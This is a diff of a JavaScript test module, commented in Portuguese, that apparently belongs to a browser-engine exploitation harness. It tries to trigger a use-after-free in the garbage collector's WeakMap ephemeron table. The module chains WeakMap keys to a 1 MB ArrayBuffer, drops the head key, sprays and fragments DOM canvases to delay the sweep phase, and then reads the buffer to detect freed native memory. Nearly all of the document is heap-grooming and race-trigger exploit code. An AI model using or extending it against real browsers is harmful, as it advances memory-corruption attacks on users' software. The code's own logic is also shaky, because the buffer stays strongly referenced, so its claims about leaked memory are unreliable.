@@ -1,49 +1,74 @@
-import { GCOracle } from '../mod_executor.js';
+
 import { Groomer } from '../mod_groomer.js';
 
 export default {
     id:       'WEAKMAP_EPHEMERON_UAF',
     category: 'CoreJS',
-    risk:     'HIGH',
+    risk:     'CRITICAL',
     description:
-        'Força o desync da tabela de Ephemerons do GC. ' +
-        'O Groomer vai inundar a memória com dezenas de milhares de divs ' +
-        'para atrasar o "Sweeping Phase" C++ após apagarmos a chave.',
+        'Desincronização da tabela de Ephemerons do GC. Cria uma corrente de dependência (k1->k2->buffer). ' +
+        'k1 é anulado, forçando o GC a marcar a árvore morta. Esburacamos a RAM para atrasar a ' +
+        'fase de Sweeping e tentamos aceder à memória nativa prematuramente.',
 
     setup: function() {
         this.wm = new WeakMap();
+        this.results = {};
         
-        // Chave que vai MORRER
-        this.deadKey = document.createElement('span');
-        this.wm.set(this.deadKey, new ArrayBuffer(1024));
+        // As chaves do Ephemeron
+        this.k1 = {};
+        this.k2 = {};
         
-        // Chave que vai FICAR VIVA
-        this.aliveKey = document.createElement('div');
-        this.wm.set(this.aliveKey, [1.1, 2.2, 3.3]);
+        // A Memória Nativa Suculenta (ArrayBuffer)
+        this.buffer = new ArrayBuffer(1024 * 1024); // 1MB
+        new Uint32Array(this.buffer)[0] = 0x1337;
 
-        // 🚨 Oráculo: Se a deadKey não morrer no C++, o ataque falhou.
-        if (GCOracle.registry) GCOracle.registry.register(this.deadKey, `${this.id}_target`);
+        // A Corrente C++
+        this.wm.set(this.k1, this.k2);
+        this.wm.set(this.k2, this.buffer);
     },
 
-    trigger: function() {
-        // Libera a deadKey para acionar a limpeza da tabela do GC
-        this.deadKey = null;
+    trigger: async function() {
+        // 1. O GATILHO: Cortamos a cabeça da cobra. k2 e buffer agora são lixo.
+        this.k1 = null;
 
-        // 🚨 O GATILHO DA CORRIDA (Race Condition):
-        // Inundamos o bmalloc (DOM) e o forçamos a varrer a memória desesperadamente
-        let nodes = Groomer.sprayDOM('div', 5000);
-        Groomer.punchHoles(nodes, 2);
+        // 2. Fragmentamos a memória massivamente para ocupar a thread de Sweeping do GC
+        let trash = Groomer.sprayDOM('canvas', 500);
+        Groomer.punchHoles(trash, 2);
+
+        // Dá um microssegundo para o GC arrancar, mas não tempo suficiente para terminar a varredura
+        await new Promise(r => setTimeout(r, 2));
+
+        try {
+            // A BOMBA: Tentamos ler a memória de k2.
+            // Se o marcador do GC se perdeu, a memória nativa pode ter sido apagada 
+            // mas o JS ainda retém o ponteiro!
+            let view = new Uint32Array(this.buffer);
+            this.results.leak = view[0];
+        } catch(e) {
+            this.results.error = e.constructor.name;
+        }
     },
 
     probe: [
-        // A aliveKey nunca foi zerada! TEM que retornar true.
-        // Se retornar false, a tabela do GC corrompeu e o UAF é letal.
-        s => s.wm.has(s.aliveKey)
+        s => s.results.error || 'Leitura de Memória Concluída',
+        
+        s => {
+            let leak = s.results.leak;
+            if (leak !== undefined) {
+                // Se leu 0x1337 (4919), é stale data seguro. Se for diferente, é C++ freed memory!
+                if (leak !== 0x1337 && leak !== 0) {
+                    return leak; // Dispara STALE DATA no HUD
+                }
+            }
+            return 0; // Seguro
+        }
     ],
 
     cleanup: function() {
+        this.k1 = null;
+        this.k2 = null;
+        this.buffer = null;
         this.wm = null;
-        this.aliveKey = null;
-        this.deadKey = null;
+        this.results = {};
     }
 };
